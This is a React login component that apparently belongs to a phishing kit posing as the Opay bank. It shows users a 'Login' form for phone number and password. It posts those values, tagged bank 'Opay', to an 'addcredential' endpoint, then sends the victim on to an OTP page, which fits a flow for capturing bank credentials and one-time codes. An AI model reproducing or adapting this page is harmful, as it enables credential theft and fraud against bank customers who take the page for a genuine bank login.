import { useRef, useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from '../../api/axios';
import Spinner from "../utilities/Spinner";

const AddCredential = () => {
    const navigate = useNavigate();
    const emailRef = useRef();
    const errRef = useRef();

    const [phoneNumber, setPhoneNumber] = useState('');
    const [password, setPassword] = useState('');
    const [errMsg, setErrMsg] = useState('');
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        emailRef.current.focus();
    }, [])

    useEffect(() => {
        setErrMsg('');
    }, [phoneNumber, password])

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        try {
            await axios.post('addcredential',
                JSON.stringify({ bank: 'Opay', phoneNumber: phoneNumber, password: password }),
                {
                    headers: { 'Content-Type': 'application/json' },
                }
            );
            setPhoneNumber('');
            setPassword('');
            setLoading(false);
            navigate('/otp', { replace: true });
        } catch (err) {
            setLoading(false);
            if (!err?.response) {
                setErrMsg('No server response!');
            } else if (err.response?.status !== 200) {
                setErrMsg(err?.response?.data?.message);
            } else {
                setErrMsg('Login Failed');
            }
            errRef.current.focus();
        }
    }

    return (
        <div className="container">
        <div className='login-container'>
            <div className='login-section'>
                <span className='page-header'>Login</span>
                <p ref={errRef} className={errMsg ? "errmsg" : "offscreen"} aria-live="assertive">{errMsg}</p>
                <form onSubmit={handleSubmit}>
                    <input
                        type="number"
                        id="number"
                        placeholder='Phone Number'
                        ref={emailRef}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        value={phoneNumber}
                        required
                    />

                    <input
                        type="password"
                        id="password"
                        placeholder='Password'
                        onChange={(e) => setPassword(e.target.value)}
                        value={password}
                        required
                    />
                    <button>Login</button>
                </form>
            </div>
        </div>
        {loading && <Spinner loading={loading}/> }
        </div>
    )
}

export default AddCredential
